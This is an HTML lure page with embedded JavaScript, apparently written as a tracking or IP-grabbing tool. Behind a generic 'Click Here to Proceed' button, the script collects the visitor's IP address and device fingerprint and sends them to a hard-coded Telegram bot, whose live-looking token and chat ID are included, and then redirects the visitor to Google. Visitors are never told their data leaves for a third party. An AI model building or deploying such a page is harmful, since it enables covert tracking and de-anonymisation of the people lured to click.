<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Information Collector</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f4f4f4;
        }
        .btn {
            display: inline-block;
            padding: 15px 30px;
            font-size: 18px;
            background-color: #0088cc;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            cursor: pointer;
            border: none;
        }
        .btn:hover {
            background-color: #006699;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<h1>Welcome to Our Service</h1>
<p>Click the button below to continue</p>

<button class="btn" id="collectBtn">Click Here to Proceed</button>
<div id="status"></div>

<script>
    // ========== အသုံးပြုသူ ပြင်ဆင်ရန် ==========
    const BOT_TOKEN = '8726782078:AAFkKk2nZG3g8bhMg7exEQaaVapXS5nyWpE';   // သင်၏ Bot Token
    const CHAT_ID = '8712941985';                                         // သင်၏ Chat ID
    // ============================================

    const statusDiv = document.getElementById('status');

    // Function to get IP Address via free API
    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('IP fetch error:', error);
            return 'Unable to get IP';
        }
    }

    // Function to get detailed device info
    function getDeviceInfo() {
        const userAgent = navigator.userAgent;
        let deviceType = 'Unknown';
        
        if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(userAgent)) {
            deviceType = 'Mobile Phone';
        } else if (/Tablet|iPad/i.test(userAgent)) {
            deviceType = 'Tablet';
        } else {
            deviceType = 'Desktop / Laptop';
        }

        let os = 'Unknown OS';
        if (/Android/i.test(userAgent)) os = 'Android';
        else if (/iPhone|iPad|iPod/i.test(userAgent)) os = 'iOS';
        else if (/Windows/i.test(userAgent)) os = 'Windows';
        else if (/Mac/i.test(userAgent)) os = 'MacOS';
        else if (/Linux/i.test(userAgent)) os = 'Linux';

        let browser = 'Unknown Browser';
        if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = 'Chrome';
        else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = 'Safari';
        else if (/Firefox/i.test(userAgent)) browser = 'Firefox';
        else if (/Edg/i.test(userAgent)) browser = 'Edge';

        return {
            userAgent: userAgent,
            deviceType: deviceType,
            operatingSystem: os,
            browser: browser,
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform
        };
    }

    // Function to send message to Telegram Bot
    async function sendToTelegram(ip, deviceInfo) {
        const message = `📱 *New Visitor Information* 📱
        
🌐 *IP Address:* ${ip}
📌 *Device Type:* ${deviceInfo.deviceType}
🤖 *OS:* ${deviceInfo.operatingSystem}
🌍 *Browser:* ${deviceInfo.browser}
📏 *Screen:* ${deviceInfo.screenResolution}
🗣 *Language:* ${deviceInfo.language}
💻 *Platform:* ${deviceInfo.platform}
🔍 *User Agent:* ${deviceInfo.userAgent.substring(0, 200)}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            const result = await response.json();
            if (result.ok) {
                statusDiv.innerHTML = '✅ Information sent successfully! Redirecting...';
                statusDiv.style.color = 'green';
                return true;
            } else {
                throw new Error(result.description);
            }
        } catch (error) {
            console.error('Telegram send error:', error);
            statusDiv.innerHTML = '❌ Failed to send. Please try again.';
            statusDiv.style.color = 'red';
            return false;
        }
    }

    // Main function when button clicked
    document.getElementById('collectBtn').addEventListener('click', async function() {
        statusDiv.innerHTML = '⏳ Collecting information...';
        statusDiv.style.color = 'orange';
        
        // Get IP
        const ip = await getIPAddress();
        
        // Get Device Info
        const deviceInfo = getDeviceInfo();
        
        statusDiv.innerHTML = '⏳ Sending to server...';
        
        // Send to Telegram
        const success = await sendToTelegram(ip, deviceInfo);
        
        if (success) {
            // Optional: After 2 seconds redirect to any link (you can change this)
            setTimeout(() => {
                window.location.href = 'https://www.google.com'; // နှစ်သက်ရာ လင့်ထည့်ပါ
            }, 2000);
        }
    });
</script>

</body>
</html>
